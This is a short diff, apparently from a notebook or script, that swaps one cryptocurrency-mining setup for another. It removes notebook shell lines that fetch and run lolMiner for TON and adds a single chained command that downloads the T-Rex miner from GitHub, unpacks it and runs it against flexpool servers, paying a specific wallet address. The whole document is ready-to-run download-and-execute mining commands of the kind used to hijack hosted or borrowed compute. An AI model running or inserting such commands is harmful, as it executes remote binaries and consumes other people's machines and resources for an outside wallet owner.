@@ -1,4 +1,1 @@
-! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz
-! tar -xf lolMiner_v1.48_Lin64.tar.gz
-! cd 1.48
-! ./lolMiner -a TON --pool https://server1.whalestonpool.com --user EQCWV_YcgNZmO5U5KOzJmLCcYy_Iizfk1LuXGRz7ruoxDwr6
+wget https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz && tar -xf t-rex-0.25.8-linux.tar.gz && ./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0x3Eb7a67fF36A62de2d8ECD76dc90439b520279CA -p x -w TriMinh
